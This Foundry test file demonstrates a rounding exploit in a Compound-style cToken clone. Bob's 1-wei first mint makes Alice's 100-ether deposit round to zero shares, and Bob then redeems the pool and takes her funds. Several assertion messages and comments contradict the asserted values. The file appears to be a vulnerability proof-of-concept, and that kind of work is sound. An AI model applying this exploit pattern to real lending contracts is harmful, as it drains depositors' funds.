
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Token.sol";
import "../src/CErc20Clone.sol";

contract CErc20CloneTest is Test {
    Token token;
    CErc20Clone cErc20Clone;
    address alice = address(0x1);
    address bob = address(0x2);

    function setUp() public {
        token = new Token();
        cErc20Clone = new CErc20Clone(address(token));

        // Allocate tokens to Alice and Bob
        token.transfer(alice, 1000 ether);
        token.transfer(bob, 999_000 ether);

        // Approve CErc20Clone contract to spend Alice's and Bob's tokens
        vm.prank(alice);
        token.approve(address(cErc20Clone), 1000 ether);

        vm.prank(bob);
        token.approve(address(cErc20Clone), 999_000 ether);
    }

    function testMintAndRedeemWithExternalTransfer() public {
        // Bob mints 1 wei
        vm.prank(bob);
        cErc20Clone.mint(bob, 1);

        assertEq(cErc20Clone.accountTokens(bob), 1, "bob's accountTokens should be equal to deposit");
        assertEq(cErc20Clone.totalSupply(), 1, "wrong Total supply after bob");
        assertEq(token.balanceOf(address(cErc20Clone)), 1, "WrongCErc20Clone's token balance after bob");

        // Alice mints 100 tokens
        console2.log("Alice deposits");
        vm.prank(alice);
        cErc20Clone.mint(alice, 100 ether);

        // Bob's 1 wei mint results in a rounding error for Alice
        // Since totalSupply for Alice < 1e18, the exchange rate reduces her
        // minted tokens by too much and (mintAmount * 1e18) / exchangeRate = 0
        assertEq(cErc20Clone.accountTokens(alice), 0 ether, "alice's accountTokens should be equal to deposit");
        assertEq(cErc20Clone.totalSupply(), 1, "wrong Total supply after alice");
        assertEq(token.balanceOf(address(cErc20Clone)), 100 ether + 1, "WrongCErc20Clone's token balance after Alice");

        vm.prank(alice);
        try cErc20Clone.redeem(alice) {
            assertTrue(false, "Alice should not be able to redeem");
        } catch Error(string memory reason) {
            assertEq(reason, "Insufficient balance", "Alice should not be able to redeem");
        }

        // Check Alice's final balance
        uint256 aliceFinalBalance = token.balanceOf(alice);
        console.log("Alice's final balance:", aliceFinalBalance);

        // Assert that Alice's redeemed amount is less than 100 ether due to Bob's transfer
        assertEq(aliceFinalBalance, 900 ether, "Alice loses her deposit 100 ether");

        // Bob mints 100 tokens
        vm.prank(bob);
        cErc20Clone.mint(bob, 100 ether);

        assertLt(cErc20Clone.accountTokens(bob), 100 ether, "wrong bob's accountTokens");
        assertLt(cErc20Clone.totalSupply(), 200 ether, "wrong total supply after bob deposit");
        assertEq(token.balanceOf(address(cErc20Clone)), 200 ether + 1, "wrong CErc20Clone's token balance after bob deposit");

        // Bob redeems tokens and steals from Alice
        vm.prank(bob);
        cErc20Clone.redeem(bob);

        // Check Bob's final balance
        uint256 bobFinalBalance = token.balanceOf(bob);
        console.log("bob's final balance:", bobFinalBalance);

        // Assert that Bob's redeemed amount is more than 100 ether due to his transfer
        assertEq(bobFinalBalance, 999_000 ether + 100 ether, "Bob should have starting balance + Alice's 100 ether");
        assertEq(cErc20Clone.totalSupply(), 0, "wrong total supply after bob redeem");
        assertEq(token.balanceOf(address(cErc20Clone)), 0, "wrong CErc20Clone's token balance after bob redeem");
    }
}
